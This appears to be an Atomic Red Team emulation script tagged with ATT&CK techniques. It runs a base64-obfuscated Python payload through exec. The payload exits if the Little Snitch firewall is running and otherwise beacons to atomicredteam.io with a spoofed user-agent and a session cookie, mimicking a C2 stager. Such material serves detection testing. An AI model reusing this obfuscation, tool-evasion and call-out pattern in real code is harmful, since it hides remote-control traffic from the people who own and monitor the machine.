# import sys;import re, subprocess;cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
# ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
# out = ps.stdout.read()
# ps.stdout.close()
# if re.search("Little Snitch", out):
#    sys.exit()
# import urllib2;
# UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://atomicredteam.io';t='/news.php';req=urllib2.Request(server+t);
# req.add_header('User-Agent',UA);
# req.add_header('Cookie',"session=BmHiW7UA/sf9C279oE2owK9LZ0c=");
# proxy = urllib2.ProxyHandler();
# o = urllib2.build_opener(proxy);
# urllib2.install_opener(o);
# a=urllib2.urlopen(req).read();

# Tactic: Defense Evasion
# Technique: T1140 - Deobfuscate/Decode Files or Information
#
# Tactic: Discovery
# Technique: T1057 - Process Discovery
#
# Tactic: Command and Control
# Technique: T1043 - Commonly Used Port
#
import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly9hdG9taWNyZWR0ZWFtLmlvJzt0PScvbmV3cy5waHAnO3JlcT11cmxsaWIyLlJlcXVlc3Qoc2VydmVyK3QpOwpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsVUEpOwpyZXEuYWRkX2hlYWRlcignQ29va2llJywic2Vzc2lvbj1CbUhpVzdVQS9zZjlDMjc5b0Uyb3dLOUxaMGM9Iik7CnByb3h5ID0gdXJsbGliMi5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKHByb3h5KTsKdXJsbGliMi5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIyLnVybG9wZW4ocmVxKS5yZWFkKCk7'))